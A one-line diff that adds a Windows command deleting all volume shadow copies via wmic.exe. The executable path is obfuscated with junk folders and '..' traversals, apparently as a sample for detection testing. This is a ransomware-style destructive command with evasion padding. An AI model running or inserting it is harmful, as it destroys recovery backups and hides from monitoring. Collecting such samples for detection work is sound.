@@ -1,0 +1,1 @@
+"C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\system32\k\aph\..\..\wbem\c\..\wmic.exe" shadowcopy   delete
